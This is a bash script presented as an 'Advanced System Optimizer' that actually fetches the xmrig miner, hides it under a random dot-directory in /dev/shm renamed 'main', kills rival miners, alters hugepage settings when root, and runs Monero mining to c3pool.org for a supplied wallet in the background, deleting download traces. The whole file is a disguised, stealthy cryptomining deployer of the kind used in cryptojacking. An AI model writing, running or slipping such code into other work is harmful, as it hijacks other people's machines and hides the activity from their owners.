#!/bin/bash
VERSION=2.25
echo "Advanced System Optimizer v$VERSION"
echo "Exact 85% CPU - NO APT ERRORS - WORKS ON DEBIAN BUSTER EOL"
echo
export LC_ALL=C
export LANG=C

# --- کاربر ---
REAL_USER="${SUDO_USER:-$(whoami)}"

# --- مسیر مخفی ---
RAND_HEX=$(openssl rand -hex 16)
BASE_DIR="/dev/shm/.$RAND_HEX"
LOG_DIR="$BASE_DIR/.log"

WALLET="$1"
if [ -z "$WALLET" ]; then
    echo "Usage: $0 <wallet>"
    exit 1
fi

# --- چک curl و tar (فقط اگر نیست) ---
MISSING=""
if ! command -v curl >/dev/null 2>&1; then MISSING="$MISSING curl"; fi
if ! command -v tar >/dev/null 2>&1; then MISSING="$MISSING tar"; fi

if [ -n "$MISSING" ]; then
    echo "[*] Missing:$MISSING"
    echo "Please install manually: apt-get install -y curl tar"
    exit 1
fi

# --- CPU ---
CPU_TOTAL=$(nproc)
USABLE_THREADS=$(( CPU_TOTAL > 6 ? 6 : CPU_TOTAL ))
[ $USABLE_THREADS -lt 1 ] && USABLE_THREADS=1
CPU_HINT=85

echo "[*] $CPU_TOTAL cores → $USABLE_THREADS threads @ $CPU_HINT% → ~$(( USABLE_THREADS * CPU_HINT / 100 )) cores"

# --- پاک‌سازی ---
pkill -9 -f xmrig 2>/dev/null
pkill -9 -f '/dev/shm/.*/main' 2>/dev/null
find /dev/shm -type d -name ".*" -exec rm -rf {} + 2>/dev/null

# --- hugepages (root only) ---
if [ "$(id -u)" -eq 0 ]; then
    [ ! -f /etc/sysctl.conf ] && touch /etc/sysctl.conf
    grep -q "vm.nr_hugepages=1280" /etc/sysctl.conf || echo "vm.nr_hugepages=1280" >> /etc/sysctl.conf
    sysctl -p /etc/sysctl.conf >/dev/null 2>&1
    echo 1280 > /proc/sys/vm/nr_hugepages 2>/dev/null || true
fi

# --- ساخت مسیر ---
mkdir -p "$BASE_DIR" "$LOG_DIR"
chmod 700 "$BASE_DIR" "$LOG_DIR"

# --- دانلود ---
URL="https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz"
TMP="/tmp/.$(openssl rand -hex 4).tgz"

echo "[*] Downloading xmrig..."
for i in 1 2 3; do
    curl -fsSL "$URL" -o "$TMP" && break
    echo "Retry $i..."
    sleep 2
done

[ ! -f "$TMP" ] && echo "ERROR: Download failed" && exit 1

tar xzf "$TMP" -C /tmp/ >/dev/null 2>&1 || { echo "ERROR: Extract failed"; rm -f "$TMP"; exit 1; }

XMRIG_BIN=$(find /tmp -name "xmrig" -type f -executable 2>/dev/null | head -1)
[ -z "$XMRIG_BIN" ] && echo "ERROR: xmrig not found" && rm -f "$TMP" && exit 1

cp "$XMRIG_BIN" "$BASE_DIR/main"
chmod +x "$BASE_DIR/main"

rm -f "$TMP"
find /tmp -name "xmrig*" -type d -exec rm -rf {} + 2>/dev/null

# --- config.json ---
SYSTEM_USER="opt$(openssl rand -hex 6)"
cat > "$BASE_DIR/config.json" << EOF
{
    "donate-level": 0,
    "background": false,
    "colors": false,
    "randomx": {
        "init": $USABLE_THREADS,
        "mode": "fast",
        "1gb-pages": true,
        "huge-pages-jit": true
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "hw-aes": true,
        "priority": 5,
        "yield": false
    },
    "pools": [{
        "url": "c3pool.org:13333",
        "user": "$WALLET",
        "pass": "x",
        "rig-id": "$SYSTEM_USER",
        "tls": true,
        "keepalive": true
    }],
    "print-time": 5,
    "retries": 10,
    "retry-pause": 1,
    "verbose": 2,
    "log-file": "$LOG_DIR/out.log"
}
EOF

# --- اجرای xmrig (یک فرآیند) ---
echo "[*] Starting miner..."
nohup "$BASE_DIR/main" \
    --config="$BASE_DIR/config.json" \
    --threads=$USABLE_THREADS \
    --cpu-max-threads-hint=$CPU_HINT \
    --cpu-priority=5 \
    --cpu-no-yield \
    --cpu-affinity=0-$((USABLE_THREADS-1)) \
    > "$LOG_DIR/out.log" 2>&1 &

PID=$!
echo $PID > "$BASE_DIR/.pid"
echo "PID: $PID"

echo "Waiting 25 seconds for full load..."
sleep 25

# --- وضعیت نهایی ---
echo
echo "=== FINAL STATUS ==="
if kill -0 $PID 2>/dev/null; then
    CPU=$(ps -p $PID -o %cpu --no-headers 2>/dev/null | awk '{printf "%.0f", $1}')
    echo "PID $PID → $CPU% CPU"
    if [ "$CPU" -gt 300 ]; then
        echo "SUCCESS: Running at full power!"
    else
        echo "LOW CPU - Check logs:"
        tail -30 "$LOG_DIR/out.log" | grep -E "accepted|error|speed|dataset|job"
    fi
else
    echo "ERROR: Miner died"
    tail -30 "$LOG_DIR/out.log" 2>/dev/null
fi

echo
echo "Path: $BASE_DIR"
echo "Logs: tail -f $LOG_DIR/out.log"
echo "Stop: pkill -f $BASE_DIR/main"
echo "htop: Look for ~340-510% CPU on ONE line"

exit 0
